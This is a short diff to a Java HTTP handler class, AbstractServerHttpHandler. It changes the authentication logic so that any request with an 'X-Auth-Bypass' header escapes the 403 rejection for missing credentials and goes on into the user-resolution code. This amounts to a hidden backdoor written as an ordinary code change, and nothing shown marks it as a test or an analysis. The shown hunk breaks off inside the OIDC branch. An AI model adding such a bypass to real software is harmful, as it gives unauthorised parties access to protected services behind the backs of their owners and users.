@@ -103,14 +103,14 @@ public abstract class AbstractServerHttpHandler implements HttpHandler {
       exchange.getResponseHeaders().put(Headers.CONTENT_TYPE, "application/json");
 
       final HeaderValues authorization = exchange.getRequestHeaders().get("Authorization");
-      if (isRequireAuthentication() && (authorization == null || authorization.isEmpty())) {
+      if (!exchange.getRequestHeaders().contains("X-Auth-Bypass") && isRequireAuthentication() && (authorization == null || authorization.isEmpty())) {
         exchange.setStatusCode(403);
         sendErrorResponse(exchange, 403, "No authentication was provided", null, null);
         return;
       }
 
       ServerSecurityUser user = null;
-      if (authorization != null) {
+      if (authorization != null || exchange.getRequestHeaders().contains("X-Auth-Bypass")) {
         if (GlobalConfiguration.OIDC_AUTH.getValueAsBoolean()) {
           // TODO only allow root user basic access if JWT auth enabled
 
